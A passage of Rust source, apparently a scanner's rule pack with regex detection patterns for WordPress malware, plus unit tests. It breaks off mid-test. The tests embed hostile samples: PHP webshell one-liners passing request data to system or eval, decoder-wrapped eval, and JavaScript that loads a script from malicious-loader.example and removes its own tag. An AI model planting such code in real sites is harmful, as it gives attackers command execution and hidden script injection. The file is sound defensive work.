//! Layer C: a small compiled-in rule pack for files nothing else vouches for.
//!
//! Input is attacker-controlled bytes, so everything is `regex::bytes` (linear
//! time, no UTF-8 assumption) with bounded repetitions, and the output is
//! bounded too: at most `MAX_HITS` hits per file, `MAX_DOMAINS` domains and
//! `SNIPPET_CHARS` characters of snippet per hit. Snippets are plain text with
//! control characters removed; HTML escaping stays in the template.
//!
//! Rules are tuned against false positives on plain custom code (a child theme
//! hooking `wp_footer` with a short inline script, `base64_decode` on its own,
//! a minified helper loading a same-origin script), because these files get no
//! other vouching.

use std::collections::HashSet;
use std::sync::LazyLock;

use regex::bytes::{Regex, RegexSet, RegexSetBuilder};

/// Bumped whenever a rule changes; a bump re-inspects the Layer B scope once.
pub const RULE_PACK_VERSION: u32 = 1;

/// Bytes of one file that are inspected. A larger inspected file (PHP,
/// JavaScript, HTML, PHP settings) is reported as `too_large_to_inspect` (never
/// skipped silently); only the first `INSPECT_MAX_BYTES` of it are matched.
pub const INSPECT_MAX_BYTES: usize = 2 * 1024 * 1024;

const MAX_HITS: usize = 20;
const MAX_DOMAINS: usize = 10;
const SNIPPET_CHARS: usize = 120;
/// Domains are read from the matched line, but at most this far either side of
/// the match, so a one-line 2 MiB bundle costs the same as a short file.
const DOMAIN_WINDOW: usize = 4096;

/// Extensions that make a file PHP-like as the final extension.
const PHP_EXTS: [&str; 11] = [
    "php", "phtml", "phar", "php3", "php4", "php5", "php6", "php7", "php8", "pht", "inc",
];
/// Extensions that also count in the middle of a name (`x.php.jpg`): the
/// handler-mapped ones. `inc` and `pht` are not, so `x.inc.pdf` is a PDF.
const PHP_MID_EXTS: [&str; 9] = [
    "php", "phtml", "phar", "php3", "php4", "php5", "php6", "php7", "php8",
];
const SCRIPT_EXTS: [&str; 5] = ["js", "mjs", "cjs", "html", "htm"];

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Severity {
    Medium,
    High,
}

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RuleHit {
    pub rule_id: &'static str,
    pub severity: Severity,
    /// 1-based line of the match.
    pub line: u32,
    /// Host names from http(s) URLs on the matched line, deduped, lowercase.
    pub domains: Vec<String>,
    /// At most 120 characters from the match to the end of its line.
    pub snippet: String,
}

#[derive(Clone, Copy, PartialEq, Eq)]
enum Scope {
    /// PHP-like files only.
    Php,
    /// JavaScript, HTML and PHP-like files (injected `<script>` lives in all).
    Script,
    /// `.htaccess` and `.user.ini`: what PHP is told to do, not PHP itself.
    PhpSettings,
}

struct Rule {
    id: &'static str,
    severity: Severity,
    scope: Scope,
    pattern: &'static str,
    /// A second condition that must hold somewhere in the same file.
    also: Option<&'static str>,
}

/// An encoded string literal over about 3 kB. A `data:` URI never matches: the
/// run of base64 starts after a comma, not after the opening quote.
const BIG_LITERAL: &str = r#"['"][A-Za-z0-9+/=]{3000,}['"]"#;
const PAYLOAD_LITERAL: &str = r#"['"][A-Za-z0-9+/=]{256,}['"]"#;

/// High rules first: when a file hits the cap, the worst findings survive.
const RULES: &[Rule] = &[
    Rule {
        id: "eval_decoder",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?i-u)\b(?:eval|assert)\s*\(\s*@?\s*(?:base64_decode|gzinflate|gzuncompress|gzdecode|str_rot13|convert_uudecode|hex2bin|strrev|rawurldecode)\s*\(",
        also: None,
    },
    Rule {
        id: "request_to_exec",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?i-u)\b(?:eval|assert|system|passthru|shell_exec|exec|popen|proc_open|pcntl_exec)\s*\(\s*@?\s*(?:(?:stripslashes|base64_decode|trim)\s*\(\s*)?@?\$_(?:GET|POST|REQUEST|COOKIE)\b",
        also: None,
    },
    Rule {
        id: "request_callable",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?-u)\$_(?:GET|POST|REQUEST|COOKIE)\s*\[[^\]\n]{1,64}\]\s*\(",
        also: None,
    },
    Rule {
        id: "webshell_marker",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r"(?i-u)\b(?:b374k|c99\s*shell|c99\s*madshell|r57\s*shell|filesman|wso\s*shell|wso_version|wsosetcookie|indoxploit|p0wny\s*shell|alfa_data|weevely|china\s*chopper)\b",
        also: None,
    },
    Rule {
        id: "footer_hook_payload",
        severity: Severity::High,
        scope: Scope::Php,
        pattern: r#"(?i-u)\badd_action\s*\(\s*['"](?:wp_footer|wp_head)['"]"#,
        also: Some(PAYLOAD_LITERAL),
    },
    Rule {
        id: "js_self_removing_loader",
        severity: Severity::High,
        scope: Scope::Script,
        // The incident's behaviour: a script element with a remote src that
        // removes its own tag afterwards. Plain widget loaders (chat, analytics)
        // leave their tag in place and stay at js_remote_script.
        pattern: r#"(?i-u)createElement\s*\(\s*['"]script['"]\s*\)(?s:.){0,300}?(?:\.src\s*=|setAttribute\s*\(\s*['"]src['"]\s*,)\s*['"]?(?:https?:)?//[a-z0-9](?s:.){0,300}?(?:removeChild\s*\(|\.remove\s*\(\s*\))"#,
        also: None,
    },
    Rule {
        id: "encoded_literal_large",
        severity: Severity::Medium,
        scope: Scope::Php,
        pattern: BIG_LITERAL,
        also: None,
    },
    Rule {
        id: "js_remote_script",
        severity: Severity::Medium,
        scope: Scope::Script,
        // A script element given a remote src, or document.write of a remote
        // <script>. A relative or same-origin path has no `//` after the quote.
        pattern: r#"(?i-u)(?:createElement\s*\(\s*['"]script['"]\s*\)(?s:.){0,300}?(?:\.src\s*=|setAttribute\s*\(\s*['"]src['"]\s*,)\s*['"]?(?:https?:)?//[a-z0-9]|document\.write\s*\(\s*['"]<script[^>]{0,160}?\ssrc\s*=\s*\\?['"]?(?:https?:)?//[a-z0-9])"#,
        also: None,
    },
    Rule {
        id: "js_atob_eval",
        severity: Severity::Medium,
        scope: Scope::Script,
        pattern: r"(?-u)\b(?:eval|Function)\s*\([^;{}]{0,80}?\batob\s*\(",
        also: None,
    },
    Rule {
        id: "php_prepend_setting",
        // Runs a file before every request. Also how Wordfence sets up its
        // firewall, so it's worth a look and not an alarm.
        severity: Severity::Medium,
        scope: Scope::PhpSettings,
        // `R`: PHP's ini parser takes a bare CR as a line end too.
        pattern: r"(?imR-u)^[ \t]*(?:php_value[ \t]+)?auto_(?:prepend|append)_file\b",
        also: None,
    },
];

struct Compiled {
    rule: &'static Rule,
    re: Regex,
    also: Option<Regex>,
}

struct Pack {
    set: RegexSet,
    rules: Vec<Compiled>,
    url: Regex,
}

fn build_pack() -> Result<Pack, regex::Error> {
    let set = RegexSetBuilder::new(RULES.iter().map(|r| r.pattern)).build()?;
    let mut rules = Vec::with_capacity(RULES.len());
    for rule in RULES {
        rules.push(Compiled {
            rule,
            re: Regex::new(rule.pattern)?,
            also: rule.also.map(Regex::new).transpose()?,
        });
    }
    // Scheme (or a quote for a protocol-relative URL), optional userinfo, then
    // a dotted host. Dotless hosts (`localhost`) are not worth reporting.
    let url = Regex::new(
        r#"(?i-u)(?:https?:|['"])//(?:[^/\s'"@<>]{1,100}@)?([a-z0-9][a-z0-9.-]{0,251}\.[a-z0-9-]{1,63})"#,
    )?;
    Ok(Pack { set, rules, url })
}

// The patterns are compile-time constants and `rule_pack_compiles` builds the
// pack, so a failure here is caught by the test suite, never in production.
#[allow(clippy::expect_used)]
static PACK: LazyLock<Pack> = LazyLock::new(|| build_pack().expect("rule pack patterns compile"));

/// PHP can run under this name: a PHP extension as the final extension, or a
/// handler-mapped one followed by more (`x.php.jpg`, which older Apache setups
/// execute). `inc` and `pht` count only as the final extension.
pub fn is_php_like(rel_path: &str) -> bool {
    let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
    let mut exts = name.split('.').skip(1).peekable();
    while let Some(ext) = exts.next() {
        let set: &[&str] = if exts.peek().is_none() {
            &PHP_EXTS
        } else {
            &PHP_MID_EXTS
        };
        if set.iter().any(|e| ext.eq_ignore_ascii_case(e)) {
            return true;
        }
    }
    false
}

/// A directory named exactly `uploads` anywhere in the path: nested installs
/// (`blog/wp-content/uploads/`) and non-WordPress layouts count.
fn under_uploads(rel_path: &str) -> bool {
    let mut parts = rel_path.split('/');
    parts.next_back();
    parts.any(|c| c == "uploads")
}

fn is_script_like(rel_path: &str) -> bool {
    rel_path
        .rsplit_once('.')
        .is_some_and(|(_, ext)| SCRIPT_EXTS.iter().any(|e| ext.eq_ignore_ascii_case(e)))
}

fn is_php_settings(rel_path: &str) -> bool {
    matches!(
        rel_path.rsplit('/').next().unwrap_or(rel_path),
        ".htaccess" | ".user.ini"
    )
}

fn is_core_lookalike(rel_path: &str) -> bool {
    if rel_path.starts_with("wp-includes/") || rel_path.starts_with("wp-admin/") {
        return false;
    }
    let name = rel_path
        .rsplit('/')
        .next()
        .unwrap_or(rel_path)
        .to_ascii_lowercase();
    name.starts_with("class-wp-") && name.ends_with(".php")
}

/// Inspect one file. `rel_path` is relative to the document root. Only PHP-like,
/// JavaScript, HTML and PHP settings files get content rules; any PHP-like file
/// under a directory named `uploads` is a finding by its path alone. Never panics and
/// never returns more than 20 hits, sorted by line.
///
/// Only the first `INSPECT_MAX_BYTES` are matched. The caller must pass up to
/// `INSPECT_MAX_BYTES + 1` bytes of the file: the extra byte is what raises
/// `too_large_to_inspect`, so a caller that truncates at the cap exactly never
/// sees the signal.
pub fn inspect(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
    inspect_with(rel_path, bytes, is_php_like(rel_path))
}

/// `inspect` for a file PHP runs whatever it is called: WordPress requires
/// `.maintenance` on every load.
pub fn inspect_as_php(rel_path: &str, bytes: &[u8]) -> Vec<RuleHit> {
    inspect_with(rel_path, bytes, true)
}

fn inspect_with(rel_path: &str, bytes: &[u8], php: bool) -> Vec<RuleHit> {
    let script = php || is_script_like(rel_path);
    let settings = is_php_settings(rel_path);
    let body = &bytes[..bytes.len().min(INSPECT_MAX_BYTES)];

    let mut hits: Vec<RuleHit> = Vec::new();
    if php && under_uploads(rel_path) {
        hits.push(path_hit("php_in_uploads", Severity::High, rel_path));
    }
    if (script || settings) && bytes.len() > INSPECT_MAX_BYTES {
        hits.push(path_hit(
            "too_large_to_inspect",
            Severity::Medium,
            "larger than the 2 MiB inspect limit, only the start was checked",
        ));
    }
    if !script && !settings {
        return hits;
    }

    // Match positions per rule, High rules first, bounded by MAX_HITS each.
    let pack = &*PACK;
    let mut found: Vec<(&Compiled, Vec<(usize, usize)>)> = Vec::new();
    let mut first_start: Option<usize> = None;
    for idx in pack.set.matches(body).iter() {
        let c = &pack.rules[idx];
        let applies = match c.rule.scope {
            Scope::Php => php,
            Scope::Script => script,
            Scope::PhpSettings => settings,
        };
        if !applies {
            continue;
        }
        if c.also.as_ref().is_some_and(|a| !a.is_match(body)) {
            continue;
        }
        let spans: Vec<(usize, usize)> =
            c.re.find_iter(body)
                .take(MAX_HITS)
                .map(|m| (m.start(), m.end()))
                .collect();
        if spans.is_empty() {
            continue;
        }
        first_start = Some(first_start.map_or(spans[0].0, |m| m.min(spans[0].0)));
        found.push((c, spans));
    }

    // A core-looking name outside core plus any content rule: the name is the disguise.
    if let (Some(start), true) = (first_start, is_core_lookalike(rel_path)) {
        let name = rel_path.rsplit('/').next().unwrap_or(rel_path);
        let mut h = path_hit("core_name_decoy", Severity::Medium, name);
        h.line = line_of(body, start);
        hits.push(h);
    }

    // One hit per rule first, then more of each in turn, so a noisy rule
    // cannot hide the others.
    let mut round = 0;
    'fill: while hits.len() < MAX_HITS {
        let mut any = false;
        for (c, spans) in &found {
            if let Some(&(start, end)) = spans.get(round) {
                any = true;
                hits.push(make_hit(pack, c.rule, body, start, end));
                if hits.len() >= MAX_HITS {
                    break 'fill;
                }
            }
        }
        if !any {
            break;
        }
        round += 1;
    }
    hits.sort_by(|a, b| a.line.cmp(&b.line).then(b.severity.cmp(&a.severity)));
    hits.truncate(MAX_HITS);
    hits
}

fn path_hit(rule_id: &'static str, severity: Severity, text: &str) -> RuleHit {
    RuleHit {
        rule_id,
        severity,
        line: 1,
        domains: Vec::new(),
        snippet: clean(text.as_bytes()),
    }
}

fn make_hit(pack: &Pack, rule: &Rule, body: &[u8], start: usize, end: usize) -> RuleHit {
    let line_start = body[..start]
        .iter()
        .rposition(|&b| b == b'\n')
        .map_or(0, |p| p + 1);
    let line_end = body[end..]
        .iter()
        .position(|&b| b == b'\n')
        .map_or(body.len(), |p| end + p);
    let lo = line_start.max(start.saturating_sub(DOMAIN_WINDOW));
    let hi = line_end.min(end.saturating_add(DOMAIN_WINDOW));
    // The snippet runs to the end of the line; four bytes per character is the
    // most `clean` can use.
    let snip_end = line_end.min(start + SNIPPET_CHARS * 4);
    RuleHit {
        rule_id: rule.id,
        severity: rule.severity,
        line: line_of(body, start),
        domains: domains(&pack.url, &body[lo..hi]),
        snippet: clean(&body[start..snip_end]),
    }
}

fn line_of(body: &[u8], offset: usize) -> u32 {
    let n = body[..offset].iter().filter(|&&b| b == b'\n').count() + 1;
    u32::try_from(n).unwrap_or(u32::MAX)
}

fn domains(url: &Regex, region: &[u8]) -> Vec<String> {
    let mut seen = HashSet::new();
    let mut out = Vec::new();
    for caps in url.captures_iter(region) {
        let Some(m) = caps.get(1) else { continue };
        let host = String::from_utf8_lossy(m.as_bytes())
            .trim_end_matches(['-', '.'])
            .to_ascii_lowercase();
        if seen.insert(host.clone()) {
            out.push(host);
            if out.len() >= MAX_DOMAINS {
                break;
            }
        }
    }
    out
}

/// Lossy UTF-8, first line only, at most `SNIPPET_CHARS` characters, with
/// control and text-direction characters replaced by a space.
fn clean(raw: &[u8]) -> String {
    let line = raw
        .split(|&b| b == b'\n' || b == b'\r')
        .next()
        .unwrap_or(raw);
    let s: String = String::from_utf8_lossy(line)
        .chars()
        .take(SNIPPET_CHARS)
        .map(|c| if is_unsafe_char(c) { ' ' } else { c })
        .collect();
    s.trim_end().to_string()
}

fn is_unsafe_char(c: char) -> bool {
    c.is_control()
        || matches!(
            c,
            '\u{200b}'..='\u{200f}' | '\u{2028}'..='\u{202e}' | '\u{2060}'..='\u{2069}' | '\u{feff}'
        )
}

#[cfg(test)]
mod tests {
    use super::*;

    macro_rules! fx {
        ($name:literal) => {
            include_bytes!(concat!("../../tests/fixtures/sitescan/", $name)) as &[u8]
        };
    }

    const HOST: &str = "malicious-loader.example";

    fn ids(hits: &[RuleHit]) -> Vec<&'static str> {
        hits.iter().map(|h| h.rule_id).collect()
    }

    fn worst(hits: &[RuleHit]) -> Option<Severity> {
        hits.iter().map(|h| h.severity).max()
    }

    #[test]
    fn rule_pack_compiles() {
        const { assert!(RULE_PACK_VERSION >= 1) };
        // Forces the one-time compile: a broken pattern fails here, not in production.
        LazyLock::force(&PACK);
    }

    #[test]
    fn fake_403_shell_is_high() {
        let h = inspect("wp-content/themes/x/403.php", fx!("fake403_shell.php"));
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"webshell_marker"));
        assert!(h.iter().any(|h| h.domains.iter().any(|d| d == HOST)));
    }

    #[test]
    fn fake_doctrine_eval_is_high() {
        let h = inspect(
            "wp-content/plugins/p/src/Http.php",
            fx!("fake_doctrine.php"),
        );
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"eval_decoder"));
        assert_eq!(h[0].line, 2);
    }

    #[test]
    fn appended_js_loader_is_high() {
        let h = inspect("wp-content/themes/x/app.js", fx!("appended_js_loader.js"));
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"js_remote_script"));
        let hit = h
            .iter()
            .find(|h| h.rule_id == "js_self_removing_loader")
            .unwrap();
        assert!(hit.domains.iter().any(|d| d == HOST), "{:?}", hit.domains);
        assert_eq!(hit.line, 3);
    }

    #[test]
    fn footer_hook_with_encoded_literal_is_high() {
        let h = inspect(
            "wp-content/themes/x/functions.php",
            fx!("functions_footer.php"),
        );
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"footer_hook_payload"));
        assert!(ids(&h).contains(&"encoded_literal_large"));
        let hit = h
            .iter()
            .find(|h| h.rule_id == "footer_hook_payload")
            .unwrap();
        assert!(hit.domains.iter().any(|d| d == HOST), "{:?}", hit.domains);
    }

    #[test]
    fn clean_child_theme_functions_stays_clean() {
        let h = inspect(
            "wp-content/themes/child/functions.php",
            fx!("clean_functions.php"),
        );
        assert!(h.is_empty(), "{h:?}");
    }

    #[test]
    fn clean_minified_js_stays_clean() {
        let h = inspect(
            "wp-content/themes/child/js/helper.min.js",
            fx!("clean_minified.js"),
        );
        assert!(h.is_empty(), "{h:?}");
    }

    #[test]
    fn inspect_as_php_runs_php_rules_on_any_name() {
        let shell = fx!("fake403_shell.php");
        assert!(inspect(".maintenance", shell).is_empty());
        let h = inspect_as_php(".maintenance", shell);
        assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
        assert!(ids(&h).contains(&"webshell_marker"));
    }

    #[test]
    fn prepend_settings_are_medium_where_php_reads_them() {
        for (rel, src) in [
            (
                ".user.ini",
                &b"; Wordfence WAF\nauto_prepend_file = '/home/u/wordfence-waf.php'\n; END\n"[..],
            ),
            (
                "wp-content/uploads/.htaccess",
                b"<IfModule mod_php7.c>\n\tphp_value auto_prepend_file '/tmp/x'\n</IfModule>\n",
            ),
            (".user.ini", b"AUTO_APPEND_FILE=/tmp/x\n"),
        ] {
            let h = inspect(rel, src);
            assert_eq!(ids(&h), ["php_prepend_setting"], "{rel}");
            assert_eq!(worst(&h), Some(Severity::Medium));
        }
        // Commented out, or in another file type, is nothing.
        assert!(inspect(".user.ini", b"; auto_prepend_file = x\n").is_empty());
        assert!(inspect("a.php", b"<?php\nauto_prepend_file\n").is_empty());
        assert!(inspect("a.txt", b"auto_prepend_file = x\n").is_empty());
        // PHP's ini parser takes a bare CR as a line end, so a match starts there.
        let h = inspect(".user.ini", b"; x\rauto_prepend_file=/tmp/x\r");
        assert_eq!(ids(&h), ["php_prepend_setting"]);
        assert!(h[0].snippet.starts_with("auto_prepend_file"), "{h:?}");
        // Too big to read to the end is reported, like PHP.
        let mut big = vec![b';'; INSPECT_MAX_BYTES + 1];
        big.push(b'\n');
        assert_eq!(ids(&inspect(".htaccess", &big)), ["too_large_to_inspect"]);
        // And PHP's own rules don't run on a settings file.
        assert!(inspect(".htaccess", b"# eval(base64_decode('x'))\n").is_empty());
    }

    #[test]
    fn base64_decode_alone_is_clean() {
        let src = b"<?php $x = base64_decode($_COOKIE['t'] ?? '', true); echo strlen((string)$x);";
        assert!(inspect("a.php", src).is_empty());
    }

    #[test]
    fn footer_hook_without_payload_is_clean() {
        let src = b"<?php add_action( 'wp_head', 'my_head' ); function my_head() { echo '<meta name=\"x\" content=\"y\">'; }";
        assert!(inspect("a.php", src).is_empty());
    }

    #[test]
    fn eval_over_decoder_variants_are_high() {
        for src in [
            &b"<?php eval(gzinflate(base64_decode('AAAA')));"[..],
            b"<?php @eval ( str_rot13('abc') );",
            b"<?php assert(base64_decode($x));",
            b"<?php EVAL(\n\tgzuncompress(\n$x));",
        ] {
            let h = inspect("a.php", src);
            assert_eq!(
                worst(&h),
                Some(Severity::High),
                "{}",
                String::from_utf8_lossy(src)
            );
        }
    }

    #[test]
    fn request_data_reaching_exec_is_high() {
        for src in [
            &b"<?php system($_GET['c']);"[..],
            b"<?php eval(stripslashes($_POST['c']));",
            b"<?php passthru( $_REQUEST['c'] );",
            b"<?php shell_exec(@$_COOKIE['c']);",
            b"<?php $_POST['f']($_POST['a']);",
        ] {
            let h = inspect("a.php", src);
            assert_eq!(
                worst(&h),
                Some(Severity::High),
                "{}",
                String::from_utf8_lossy(src)
            );
        }
    }

    #[test]
    fn plain_exec_of_literal_is_clean() {
        let src = b"<?php $o = shell_exec('uptime'); echo eval_count($o); $a = $_GET['id'] ?? 0;";
        assert!(inspect("a.php", src).is_empty());
    }

    #[test]
    fn atob_into_eval_is_medium() {
        let h = inspect("a.js", b"var p=\"ZWNobw==\";eval(atob(p));");
        assert_eq!(worst(&h), Some(Severity::Medium), "{h:?}");
        assert_eq!(ids(&h), ["js_atob_eval"]);
        let h = inspect("a.js", b"new Function(window.atob(x))();");
        assert_eq!(ids(&h), ["js_atob_eval"]);
    }

    #[test]
    fn atob_alone_is_clean() {
        assert!(inspect(
            "a.js",
            b"var s=atob(document.body.dataset.s);console.log(s);"
        )
        .is_empty());
    }

    #[test]
    fn php_under_uploads_is_high() {
        let h = inspect(
            "wp-content/uploads/2024/05/image.php",
            b"<?php // nothing\n",
        );
        assert_eq!(ids(&h), ["php_in_uploads"]);
        assert_eq!(h[0].severity, Severity::High);
        assert_eq!(h[0].line, 1);
        assert_eq!(h[0].snippet, "wp-content/uploads/2024/05/image.php");
    }

    #[test]
    fn php_under_nested_or_non_wp_uploads_is_high() {
        for p in [
            "blog/wp-content/uploads/2024/x.php",
            "sub/site/wp-content/uploads/x.phtml",
            "uploads/x.php",
            "app/uploads/deep/er/x.php.jpg",
            "wp-content/uploads/sites/2/x.PHP",
        ] {
            let h = inspect(p, b"<?php // nothing\n");
            assert_eq!(ids(&h), ["php_in_uploads"], "{p}");
            assert_eq!(h[0].severity, Severity::High);
        }
    }

    #[test]
    fn uploads_must_be_a_whole_directory_name() {
        for p in [
            "my-uploads/x.php",
            "wp-content/uploads-old/x.php",
            "wp-content/Uploads/x.php",
            // A file called uploads is not a directory.
            "wp-content/uploads",
            "wp-content/uploads.php",
        ] {
            let h = inspect(p, b"<?php // nothing\n");
            assert!(!ids(&h).contains(&"php_in_uploads"), "{p}: {h:?}");
        }
    }

    #[test]
    fn php_under_uploads_ignores_other_dirs_and_non_php() {
        assert!(inspect("wp-content/plugins/p/image.php", b"<?php // nothing\n").is_empty());
        assert!(inspect("wp-content/uploads/2024/05/image.jpg", b"\xff\xd8\xff\xe0").is_empty());
        assert!(inspect("wp-content/uploadsx/a.php", b"<?php\n").is_empty());
    }

    #[test]
    fn is_php_like_covers_extensions_case_insensitive() {
        for p in [
            "a.php",
            "a.phtml",
            "a.phar",
            "a.php3",
            "a.php4",
            "a.php5",
            "a.php6",
            "a.php7",
            "a.php8",
            "a.pht",
            "a.inc",
            "x/y/A.PHP",
            "x/B.PhTmL",
            "d.d/a.Inc",
        ] {
            assert!(is_php_like(p), "{p}");
        }
        for p in [
            "a.js",
            "a.phps",
            "a.txt",
            "php",
            "dir.php/readme",
            "a.",
            ".htaccess",
            "a.pdf",
        ] {
            assert!(!is_php_like(p), "{p}");
        }
    }

    #[test]
    fn double_extension_counts_as_php_like() {
        assert!(is_php_like("wp-content/uploads/x.php.jpg"));
        assert!(is_php_like("wp-content/uploads/x.PHP.jpeg"));
        assert!(is_php_like("a.b.phtml.bak"));
        let h = inspect("wp-content/uploads/2024/x.php.jpg", b"GIF89a");
        assert_eq!(ids(&h), ["php_in_uploads"]);
    }

    #[test]
    fn inc_and_pht_count_only_as_the_final_extension() {
        for p in ["x.inc", "x.pht", "a/b.pdf.inc", "a.php.pht", "x.INC"] {
            assert!(is_php_like(p), "{p}");
        }
        for p in ["x.inc.pdf", "x.pht.jpg", "a.inc.b.txt"] {
            assert!(!is_php_like(p), "{p}");
        }
        for p in [
            "x.php.jpg",
            "x.php5.pdf",
            "x.phar.gz",
            "x.phtml.txt",
            "x.php8.bak",
        ] {
            assert!(is_php_like(p), "{p}");
        }
        let h = inspect("wp-content/uploads/2024/scan.inc.pdf", b"%PDF-1.4");
        assert!(h.is_empty(), "{h:?}");
        let h = inspect("wp-content/uploads/2024/x.inc", b"data");
        assert_eq!(ids(&h), ["php_in_uploads"]);
    }

    #[test]
    fn plain_remote_widget_loader_is_medium_not_high() {
        let tawk = b"var Tawk_API=Tawk_API||{},Tawk_LoadStart=new Date();(function(){var s1=document.createElement(\"script\"),s0=document.getElementsByTagName(\"script\")[0];s1.async=true;s1.src='https://embed.tawk.to/0000000000/default';s1.charset='UTF-8';s1.setAttribute('crossorigin','*');s0.parentNode.insertBefore(s1,s0);})();";
        let h = inspect("wp-content/themes/x/chat.js", tawk);
        assert_eq!(ids(&h), ["js_remote_script"], "{h:?}");
        assert_eq!(h[0].severity, Severity::Medium);
        assert_eq!(h[0].domains, ["embed.tawk.to"]);
        // Same shape in a PHP footer template stays Medium too.
        let crisp = b"<?php add_action('wp_footer', function () { echo '<script>window.$crisp=[];var d=document,s=d.createElement(\"script\");s.src=\"https://client.crisp.chat/l.js\";s.async=1;d.getElementsByTagName(\"head\")[0].appendChild(s);</script>'; });";
        let h = inspect("wp-content/themes/x/functions.php", crisp);
        assert_eq!(worst(&h), Some(Severity::Medium), "{h:?}");
    }

    #[test]
    fn self_removing_remote_loader_variants_are_high() {
        for src in [
            &br#"var s=document.createElement('script');s.setAttribute('src','//malicious-loader.example/a.js');document.body.appendChild(s);s.remove();"#[..],
            br#"var s=document.createElement("script");s.src="https://malicious-loader.example/a.js";document.head.appendChild(s);document.head.removeChild(s);"#,
        ] {
            let h = inspect("a.js", src);
            assert_eq!(worst(&h), Some(Severity::High), "{h:?}");
            assert!(ids(&h).contains(&"js_self_removing_loader"));
        }
        // Removal of a script that is not remote does not count.
        let h = inspect(
            "a.js",
            b"var s=document.createElement('script');s.src='/local.js';document.head.appendChild(s);s.remove();",
        );
        assert!(h.is_empty(), "{h:?}");
    }

    #[test]
    fn snippet_at_most_120_chars() {
        let mut src = b"<?php eval(base64_decode('".to_vec();
        src.extend(std::iter::repeat_n(b'A', 5000));
        src.extend_from_slice(b"'));");
        let h = inspect("a.php", &src);
        assert!(!h.is_empty());
        for hit in &h {
            assert!(hit.snippet.chars().count() <= 120, "{}", hit.snippet.len());
        }
        // Multibyte text counts characters, not bytes.
        let mut src = b"<?php eval(base64_decode('".to_vec();
        src.extend("\u{20ac}".repeat(400).as_bytes());
        let h = inspect("a.php", &src);
        assert!(h[0].snippet.chars().count() <= 120);
    }

    #[test]
    fn snippet_replaces_control_chars_and_bad_utf8() {
        let src = b"<?php eval(base64_decode(\x07\x1b[31m\xff\xfe\x00 'x'));";
        let h = inspect("a.php", src);
        assert!(!h.is_empty());
        let s = &h[0].snippet;
        assert!(s.starts_with("eval(base64_decode("));
        assert!(!s.chars().any(|c| c.is_control()), "{s:?}");
    }

    #[test]
    fn snippet_stops_at_line_end() {
        let h = inspect("a.php", b"<?php\neval(base64_decode('x'));\n$other = 1;\n");
        assert_eq!(h[0].line, 2);
        assert_eq!(h[0].snippet, "eval(base64_decode('x'));");
    }

    #[test]
    fn binary_input_does_not_panic() {
        let mut junk = Vec::new();
        let mut x: u32 = 0x9e37_79b9;
        for _ in 0..300_000 {
            x = x.wrapping_mul(1_664_525).wrapping_add(1_013_904_223);
            junk.push((x >> 24) as u8);
        }
        for p in [
            "a.php",
            "a.js",
            "a.bin",
            "wp-content/uploads/a.php",
            "class-wp-x.php",
        ] {
            let _ = inspect(p, &junk);
        }
        let _ = inspect("a.php", &[]);
        let _ = inspect("a.php", b"\xff\xfe\x00\x00");
    }

    #[test]
    fn hits_are_capped_at_20() {
        let mut src = b"<?php\n".to_vec();
        for i in 0..500 {
            src.extend_from_slice(
                format!("eval(base64_decode('{i}')); system($_GET['c']);\n").as_bytes(),
            );
        }
        let h = inspect("a.php", &src);
        assert_eq!(h.len(), MAX_HITS);
        assert!(h.windows(2).all(|w| w[0].line <= w[1].line));
    }

    #[test]
    fn domains_are_deduped_and_capped() {
        let mut line = String::from("<?php eval(base64_decode('x')); ");
        for i in 0..30 {
            line.push_str(&format!(
                "http://h{i}.example/a https://H{i}.example:8080/b "
            ));
        }
        let h = inspect("a.php", line.as_bytes());
        assert_eq!(h[0].domains.len(), MAX_DOMAINS);
        assert_eq!(h[0].domains[0], "h0.example");
        assert_eq!(h[0].domains[1], "h1.example");
    }

    #[test]
    fn domains_come_from_the_matched_line_only() {
        let h = inspect(
            "a.php",
            b"<?php // https://elsewhere.example/\neval(base64_decode('x')); // https://here.example/p?q=1\n// https://later.example\n",
        );
        assert_eq!(h[0].domains, ["here.example"]);
    }

    #[test]
    fn domain_extraction_handles_userinfo_and_junk() {
        let h = inspect(
            "a.php",
            b"<?php eval(base64_decode('x')); // http://good.example@evil.example/p http://localhost/ https:// http://-/",
        );
        assert_eq!(h[0].domains, ["evil.example"]);
    }

    #[test]
    fn core_named_decoy_with_a_content_hit_is_flagged() {
        let mut src = b"<?php\nadd_action('wp_footer','x');\n$b='".to_vec();
        src.extend(std::iter::repeat_n(b'Q', 400));
        src.extend_from_slice(b"';\n");
        let h = inspect("wp-content/plugins/p/class-wp-http-cache.php", &src);
        assert!(ids(&h).contains(&"footer_hook_payload"), "{h:?}");
        assert!(ids(&h).contains(&"core_name_decoy"), "{h:?}");
        // Same content under a neutral name: no decoy hit.
        let h = inspect("wp-content/plugins/p/helpers.php", &src);
        assert!(!ids(&h).contains(&"core_name_decoy"));
        // A core-looking name with no content hit is not a finding.
        assert!(inspect("wp-content/plugins/p/class-wp-thing.php", b"<?php echo 1;").is_empty());
    }

    #[test]
    fn large_encoded_literal_in_plain_php_is_medium() {
        let mut src = b"<?php $d = \"".to_vec();
        src.extend(std::iter::repeat_n(b'a', 3500));
        src.extend_from_slice(b"\";");
        let h = inspect("wp-content/themes/x/inc/data.php", &src);
        assert_eq!(ids(&h), ["encoded_literal_large"]);
        assert_eq!(h[0].severity, Severity::Medium);
        // Just under the line stays clean.
        let mut src = b"<?php $d = \"".to_vec();
        src.extend(std::iter::repeat_n(b'a', 2900));
        src.extend_from_slice(b"\";");
        assert!(inspect("a.php", &src).is_empty());
    }

    #[test]
    fn data_uri_in_a_footer_hook_is_clean() {
        let mut src =
            b"<?php add_action('wp_footer', function () { echo '<img src=\"data:image/png;base64,"
                .to_vec();
        src.extend(std::iter::repeat_n(b'A', 4000));
        src.extend_from_slice(b"\">'; });");
